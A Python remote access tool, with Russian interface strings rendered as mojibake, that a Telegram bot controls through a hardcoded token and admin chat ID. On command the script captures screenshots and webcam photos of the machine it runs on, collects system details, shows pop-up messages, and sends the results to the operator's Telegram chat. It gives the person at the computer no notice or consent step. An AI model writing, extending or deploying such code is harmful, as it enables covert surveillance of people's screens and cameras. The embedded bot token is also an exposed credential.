import os
import sys
import socket
import threading
import time
import telebot
from PIL import ImageGrab
import cv2
import numpy as np
import pyautogui
import platform
import psutil
import tkinter as tk
from tkinter import messagebox
from telebot import types

TOKEN = '8077328902:AAEumOjor9A0tdEWg0wD6qEFmaOSwB8LDTY'
ADMIN_CHAT_ID = '7407115131'

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è –Ω–µ —Ä–∞–±–æ—Ç–æ—é—â–∏—Ö –∞–π–ø–∏—à–Ω–∏–∫–æ–≤ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–≤ (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è)
computers = {}
current_computer = None

bot = telebot.TeleBot(TOKEN)
is_recording_screen = False
is_recording_camera = False
video_writer = None
camera = None

def update_computers_list():
   
    global computers
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    computers = {
        ip_address: f"{hostname} (–¢–µ–∫—É—â–∏–π)"
    }

def show_alert(text):
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    messagebox.showwarning("–í–Ω–∏–º–∞–Ω–∏–µ!", text)
    root.destroy()

def send_computers_list():
    try:
        message = "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–ø—å—é—Ç–µ—Ä—ã:\n"
        for ip, name in computers.items():
            message += f"\nüñ•Ô∏è {name}\nIP: {ip}\n"
        bot.send_message(ADMIN_CHAT_ID, message)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–ø–∏—Å–∫–∞: {e}")

def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = f"screenshot_{int(time.time())}.png"
    screenshot.save(filename)
    return filename

def take_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    filename = f"photo_{int(time.time())}.png"
    cv2.imwrite(filename, frame)
    cap.release()
    return filename

def get_system_info():
    info = []
    info.append(f"üíª –û–°: {platform.system()} {platform.release()}")
    info.append(f"üî¢ –í–µ—Ä—Å–∏—è: {platform.version()}")
    info.append(f"‚ö° –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {platform.processor()}")
    info.append(f"üßÆ –Ø–¥–µ—Ä: {psutil.cpu_count(logical=False)}")
    mem = psutil.virtual_memory()
    info.append(f"üß† –ü–∞–º—è—Ç—å: {mem.used//(1024**3)}/{mem.total//(1024**3)} GB")
    for part in psutil.disk_partitions():
        usage = psutil.disk_usage(part.mountpoint)
        info.append(f"üíæ {part.device}: {usage.used//(1024**3)}/{usage.total//(1024**3)} GB")
    return "\n".join(info)

def safe_shutdown():
    os._exit(0)

def remove_keyboard():
    return types.ReplyKeyboardRemove()

def show_start_button(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('/start'))
    bot.send_message(chat_id, "–ü—Ä–æ–≥—Ä–∞–º–º–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. –ù–∞–∂–º–∏—Ç–µ /start –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞.", reply_markup=markup)

@bot.message_handler(commands=['start'])
def select_computer(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for ip, name in computers.items():
        markup.add(types.KeyboardButton(f"üñ•Ô∏è {name} | {ip}"))
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–ø—å—é—Ç–µ—Ä:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('üñ•Ô∏è'))
def handle_computer_selection(message):
    global current_computer
    try:
        ip = message.text.split('|')[-1].strip()
        current_computer = ip
        show_main_menu(message.chat.id)
    except Exception as e:
        bot.reply_to(message, f"–û—à–∏–±–∫–∞ –≤—ã–±–æ—Ä–∞: {e}")

def show_main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        types.KeyboardButton('–°–∫—Ä–∏–Ω—à–æ—Çüì∏'),
        types.KeyboardButton('–§–æ—Ç–æüñº'),
        types.KeyboardButton('–°–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω –ü–öüì©'),
        types.KeyboardButton('–ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æüé•'),
        types.KeyboardButton('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —é–∑–µ—Ä–µ (HWID)üíª'),
        types.KeyboardButton('–í—ã–∫–ª—é—á–∏—Ç—åüõë'),
        types.KeyboardButton('–°–º–µ–Ω–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä‚Ü©Ô∏è')
    ]
    markup.add(*buttons)
    bot.send_message(chat_id, f"–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º:\nIP: {current_computer}", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '–°–º–µ–Ω–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä‚Ü©Ô∏è')
def change_computer(message):
    select_computer(message)

@bot.message_handler(func=lambda m: m.text == '–°–∫—Ä–∏–Ω—à–æ—Çüì∏')
def send_screenshot(message):
    try:
        with open(take_screenshot(), 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(photo.name)
    except Exception as e:
        bot.reply_to(message, f"–û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda m: m.text == '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —é–∑–µ—Ä–µ (HWID)üíª')
def send_system_info(message):
    bot.reply_to(message, get_system_info())

@bot.message_handler(func=lambda m: m.text == '–°–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω –ü–öüì©')
def ask_message(message):
    msg = bot.reply_to(message, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:")
    bot.register_next_step_handler(msg, show_on_screen)

def show_on_screen(message):
    show_alert(message.text)
    bot.reply_to(message, "–°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–∫–∞–∑–∞–Ω–æ!‚úÖ")

@bot.message_handler(func=lambda m: m.text == '–í—ã–∫–ª—é—á–∏—Ç—åüõë')
def confirm_shutdown(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å‚úÖ'), types.KeyboardButton('–û—Ç–º–µ–Ω–∞‚ùå'))
    bot.send_message(message.chat.id, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É?", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å‚úÖ')
def shutdown(message):
    bot.send_message(message.chat.id, "–ü—Ä–æ–≥—Ä–∞–º–º–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞!", reply_markup=remove_keyboard())
    show_start_button(message.chat.id)
    threading.Thread(target=safe_shutdown).start()

@bot.message_handler(func=lambda m: m.text == '–û—Ç–º–µ–Ω–∞‚ùå')
def cancel_shutdown(message):
    show_main_menu(message.chat.id)

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    update_computers_list()
    send_computers_list()
    threading.Thread(target=run_bot, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("–ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
